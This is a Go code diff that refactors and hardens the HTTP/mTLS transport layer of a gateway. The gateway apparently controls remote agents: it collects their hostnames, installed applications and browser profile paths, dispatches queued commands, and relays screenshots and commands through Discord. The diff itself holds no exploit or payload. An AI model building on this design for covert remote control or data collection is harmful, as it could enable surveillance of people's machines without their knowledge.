@@ -1,3 +1,6 @@
+// Package transport owns the HTTP/mTLS transport layer for the gateway. It
+// handles request authentication, agent identity extraction, event ingestion,
+// command queue dispatching, and Discord command forwarding.
 package transport
 
 import (
@@ -8,6 +11,7 @@ import (
 	"log/slog"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strings"
 	"sync"
 	"time"
@@ -22,6 +26,23 @@ import (
 	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/provider"
 	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/sdk"
 	pb "github.com/codevault-llc/xenomorph/platform/shared/proto/gen/go/platform/v1"
+)
+
+const (
+	maxCommandIDLen   = 128
+	maxTypeLen        = 64
+	maxStatusLen      = 32
+	maxHostnameLen    = 120
+	maxReasonLen      = 512
+	maxBrowserNameLen = 80
+	maxPathLen        = 260
+	maxAppNameLen     = 120
+	maxOSVersionLen   = 120
+
+	maxBrowsers = 32
+	maxApps     = 200
+
+	readHeaderTimeout = 30 * time.Second
 )
 
 // Server owns the HTTP transport layer for the gateway. It handles mTLS
@@ -330,13 +351,13 @@ func (s *Server) handleCommandResult(c *gin.Context) {
 
 	message := fmt.Sprintf(
 		"command_result command_id=%s type=%s status=%s approved=%t disconnect_now=%t hostname=%s reason=%s output_bytes=%d",
-		clampText(req.CommandID, 128),
-		clampText(req.Type, 64),
-		clampText(req.Status, 32),
+		clampText(req.CommandID, maxCommandIDLen),
+		clampText(req.Type, maxTypeLen),
+		clampText(req.Status, maxStatusLen),
 		req.UserApproved,
 		req.DisconnectNow,
-		clampText(req.ClientHostname, 120),
-		clampText(req.Reason, 512),
+		clampText(req.ClientHostname, maxHostnameLen),
+		clampText(req.Reason, maxReasonLen),
 		len(req.OutputData),
 	)
 
@@ -392,13 +413,13 @@ func (s *Server) forwardScreenshotToDiscord(ctx context.Context, agentID string,
 	}
 
 	if req.Status != "executed" {
-		s.discordPoster.SendChannelMessage(ctx, channelID,
+		_ = s.discordPoster.SendChannelMessage(ctx, channelID,
 			fmt.Sprintf("Screenshot request **%s** was **%s**: %s", req.CommandID, req.Status, req.Reason))
 		return
 	}
 
 	if len(req.OutputData) == 0 {
-		s.discordPoster.SendChannelMessage(ctx, channelID, "Screenshot returned empty data")
+		_ = s.discordPoster.SendChannelMessage(ctx, channelID, "Screenshot returned empty data")
 		return
 	}
 
@@ -424,7 +445,7 @@ var helpText = "**Available Commands**\n\n" +
 
 // HandleDiscordCommand routes a parsed Discord !-command to the appropriate
 // handler based on the command name. Unknown commands return a help hint.
-func (s *Server) HandleDiscordCommand(ctx context.Context, agentID, channelID, command string, args []string, userName string) error {
+func (s *Server) HandleDiscordCommand(ctx context.Context, agentID, channelID, command string, _ []string, userName string) error {
 	if s.discordPoster == nil {
 		return nil
 	}
@@ -517,26 +538,21 @@ func (s *Server) markSeen(agentID string) (inserted bool, existed bool) {
 //   - Maximum browsers: 32 (reasonable upper bound for browser enumeration).
 //   - Maximum applications: 200 (prevents unbounded memory growth).
 func normalizeEntryRequest(agentID string, req entryRequest) provider.EntryReport {
-	const (
-		maxApps     = 200
-		maxBrowsers = 32
-	)
-
 	browsers := make([]provider.BrowserInfo, 0, len(req.Browsers))
 	for _, b := range req.Browsers {
 		if len(browsers) >= maxBrowsers {
 			break
 		}
 
-		name := clampText(b.Name, 80)
+		name := clampText(b.Name, maxBrowserNameLen)
 		if name == "" {
 			continue
 		}
 
 		browsers = append(browsers, provider.BrowserInfo{
 			Name:       name,
-			BinaryPath: clampText(b.BinaryPath, 260),
-			ProfileDir: clampText(b.ProfileDir, 260),
+			BinaryPath: clampText(b.BinaryPath, maxPathLen),
+			ProfileDir: clampText(b.ProfileDir, maxPathLen),
 		})
 	}
 
@@ -546,7 +562,7 @@ func normalizeEntryRequest(agentID string, req entryRequest) provider.EntryRepor
 			break
 		}
 
-		item := clampText(app, 120)
+		item := clampText(app, maxAppNameLen)
 		if item == "" {
 			continue
 		}
@@ -555,8 +571,8 @@ func normalizeEntryRequest(agentID string, req entryRequest) provider.EntryRepor
 
 	return provider.EntryReport{
 		AgentID:               agentID,
-		Hostname:              clampText(req.Hostname, 120),
-		OSVersion:             clampText(req.OSVersion, 120),
+		Hostname:              clampText(req.Hostname, maxHostnameLen),
+		OSVersion:             clampText(req.OSVersion, maxOSVersionLen),
 		IsNewAgent:            req.IsNewAgent,
 		Browsers:              browsers,
 		InstalledApplications: apps,
@@ -596,7 +612,7 @@ func clampText(value string, limit int) string {
 //   - server.crt — server certificate for TLS handshake.
 //   - server.key — server private key.
 func (s *Server) Run(addr, certPath string) error {
-	caCert, err := os.ReadFile(certPath + "/ca.crt")
+	caCert, err := os.ReadFile(filepath.Clean(filepath.Join(certPath, "ca.crt")))
 	if err != nil {
 		return fmt.Errorf("read CA certificate: %w", err)
 	}
@@ -613,9 +629,10 @@ func (s *Server) Run(addr, certPath string) error {
 	}
 
 	server := &http.Server{
-		Addr:      addr,
-		Handler:   s.engine,
-		TLSConfig: tlsConfig,
+		Addr:              addr,
+		Handler:           s.engine,
+		TLSConfig:         tlsConfig,
+		ReadHeaderTimeout: readHeaderTimeout,
 	}
-	return server.ListenAndServeTLS(certPath+"/server.crt", certPath+"/server.key")
+	return server.ListenAndServeTLS(filepath.Join(certPath, "server.crt"), filepath.Join(certPath, "server.key"))
 }
